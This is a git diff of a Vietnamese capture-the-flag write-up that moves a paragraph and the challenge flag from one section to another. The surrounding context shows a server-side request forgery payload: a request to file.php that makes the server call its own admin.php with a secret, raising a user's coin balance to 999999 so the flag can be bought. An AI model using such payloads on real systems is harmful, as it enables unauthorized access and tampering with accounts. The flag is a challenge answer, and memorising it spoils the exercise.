@@ -132,6 +132,9 @@ try {
 
 - **Payload**: **`GET /file.php?image=http://127.0.0.1/admin.php?username=test1%26coin=999999%26secret=ChiCon1BuocNuaThoi~_~`**
 
+**Vậy là đã cập nhật đươc số tiền từ 100 lên 999999 , bây giờ chỉ cần vào lại web và mua Mystery Gift Box để xem flag thôi** 
+
+`flag : KCSC{m3rry_chr1stm4s_4nd_h4ppy_h4ck1ng}`
 
 # Write-up : Hori 's blog
 
@@ -281,9 +284,6 @@ Góc nhìn tấn công
 
 - **Kết quả** : **Đã cập nhật coin cho <b>test1</b> thành <b>999999</b>!**
 
-**Vậy là đã cập nhật đươc số tiền từ 100 lên 999999 , bây giờ chỉ cần vào lại web và mua Mystery Gift Box để xem flag thôi** 
-
-`flag : KCSC{m3rry_chr1stm4s_4nd_h4ppy_h4ck1ng}`
 
 # Write-up: silver
 
